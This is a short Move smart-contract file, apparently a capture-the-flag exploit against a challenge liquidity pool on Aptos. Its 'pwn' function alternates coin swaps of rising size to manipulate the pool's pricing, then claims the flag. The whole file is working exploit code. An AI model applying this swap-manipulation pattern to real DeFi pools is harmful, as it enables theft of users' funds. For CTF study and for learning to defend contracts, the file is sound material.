module chall3::exp{
    use ctfmovement::pool;
    use aptos_framework::coin;
    use std::signer;

    public entry fun swap12_helper(account: &signer, amount: u64){
        let coin1 = coin::withdraw<pool::Coin1>(account, amount);
        let coin2 = pool::swap_12(&mut coin1, amount);

        let addr = signer::address_of(account);
        coin::deposit<pool::Coin2>(addr, coin2);
        coin::deposit<pool::Coin1>(addr, coin1);
    }

    public entry fun swap21_helper(account: &signer, amount: u64){
        let coin2 = coin::withdraw<pool::Coin2>(account, amount);
        let coin1 = pool::swap_21(&mut coin2, amount);

        let addr = signer::address_of(account);
        coin::deposit<pool::Coin1>(addr, coin1);
        coin::deposit<pool::Coin2>(addr, coin2);
    }

    public entry fun pwn(account: &signer){
        pool::get_coin(account);
        swap12_helper(account, 5);
        swap21_helper(account, 10);
        swap12_helper(account, 12);
        swap21_helper(account, 15);
        swap12_helper(account, 20);
        swap21_helper(account, 24);
        pool::get_flag(account);
    }
}